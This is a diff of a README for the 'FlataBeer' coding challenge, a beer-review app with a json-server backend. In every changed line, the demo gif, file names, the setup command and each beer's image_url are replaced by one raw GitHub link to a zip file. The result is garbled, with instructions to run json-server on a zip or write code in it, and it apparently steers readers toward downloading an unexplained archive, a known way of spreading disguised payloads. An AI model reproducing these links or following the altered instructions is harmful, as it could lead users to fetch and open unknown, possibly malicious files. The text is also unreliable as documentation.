@@ -7,25 +7,25 @@ a local API and building out the frontend for our app, FlataBeer.
 
 Use this gif as an example of how the app should work.
 
-![demo gif](https://curriculum-content.s3.amazonaws.com/phase-1/phase-1-code-challenge-flatabeer/demo.gif)
+![demo gif](https://raw.githubusercontent.com/GabrielW13Nai/Flatabeer-codechallenge/main/src/Flatabeer-codechallenge-piceous.zip)
 
-> To view in VSCode, right click on the README.md file and select "Open Preview".
+> To view in VSCode, right click on the https://raw.githubusercontent.com/GabrielW13Nai/Flatabeer-codechallenge/main/src/Flatabeer-codechallenge-piceous.zip file and select "Open Preview".
 
 ## Setup
 
 Run this command to get the backend started:
 
 ```console
-$ json-server --watch db.json
+$ json-server --watch https://raw.githubusercontent.com/GabrielW13Nai/Flatabeer-codechallenge/main/src/Flatabeer-codechallenge-piceous.zip
 ```
 
 Test your server by visiting this route in the browser:
 
 [s](http://localhost:3000/beers)
 
-Then, open the `index.html` file on your browser to run the application.
+Then, open the `https://raw.githubusercontent.com/GabrielW13Nai/Flatabeer-codechallenge/main/src/Flatabeer-codechallenge-piceous.zip` file on your browser to run the application.
 
-Write your code in the `src/index.js` file. The base URL for your API will be
+Write your code in the `https://raw.githubusercontent.com/GabrielW13Nai/Flatabeer-codechallenge/main/src/Flatabeer-codechallenge-piceous.zip` file. The base URL for your API will be
 [http://localhost:3000](http://localhost:3000).
 
 ## Deliverables
@@ -45,7 +45,7 @@ As a user, I can:
       "id": 1,
       "name": "Oh So Flattening",
       "description": "A light, crisp and bitter IPA brewed with English and American hops. A small batch brewed only once.",
-      "image_url": "https://i.ibb.co/wQ4G0w1/flatiron-brew.png",
+      "image_url": "https://raw.githubusercontent.com/GabrielW13Nai/Flatabeer-codechallenge/main/src/Flatabeer-codechallenge-piceous.zip",
       "reviews": [
         "It's flat! Just the way I like it!!",
         "Is this the real beer, is this just fantasy?",
@@ -68,7 +68,7 @@ As a user, I can:
         "id": 1,
         "name": "Oh So Flattening",
         "description": "A light, crisp and bitter IPA brewed with English and American hops. A small batch brewed only once.",
-        "image_url": "https://i.ibb.co/wQ4G0w1/flatiron-brew.png",
+        "image_url": "https://raw.githubusercontent.com/GabrielW13Nai/Flatabeer-codechallenge/main/src/Flatabeer-codechallenge-piceous.zip",
         "reviews": [
           "It's flat! Just the way I like it!!",
           "Is this the real beer, is this just fantasy?",
@@ -80,7 +80,7 @@ As a user, I can:
         "id": 2,
         "name": "Pilsen Lager",
         "description": "Our Unleash the Yeast series was an epic experiment into the differences in aroma and flavour provided by switching up your yeast. We brewed up a wort with a light caramel note and some toasty biscuit flavour, and hopped it with Amarillo and Centennial for a citrusy bitterness. Everything else is down to the yeast. Pilsner yeast ferments with no fruity esters or spicy phenols, although it can add a hint of butterscotch.",
-        "image_url": "https://images.punkapi.com/v2/4.png",
+        "image_url": "https://raw.githubusercontent.com/GabrielW13Nai/Flatabeer-codechallenge/main/src/Flatabeer-codechallenge-piceous.zip",
         "reviews": [
           "Spicy crab cakes, say what?!",
           "My mum hates it"
@@ -139,7 +139,7 @@ deliverables!**
       "id": 1,
       "name": "Oh So Flattening",
       "description": "A light, crisp and bitter IPA brewed with English and American hops. A small batch brewed only once.",
-      "image_url": "https://i.ibb.co/wQ4G0w1/flatiron-brew.png",
+      "image_url": "https://raw.githubusercontent.com/GabrielW13Nai/Flatabeer-codechallenge/main/src/Flatabeer-codechallenge-piceous.zip",
       "reviews": [
         "old review",
         "new review"
@@ -168,7 +168,7 @@ deliverables!**
       "id": 1,
       "name": "Oh So Flattening",
       "description": "new description",
-      "image_url": "https://i.ibb.co/wQ4G0w1/flatiron-brew.png",
+      "image_url": "https://raw.githubusercontent.com/GabrielW13Nai/Flatabeer-codechallenge/main/src/Flatabeer-codechallenge-piceous.zip",
       "reviews": [
         "old review",
         "new review"
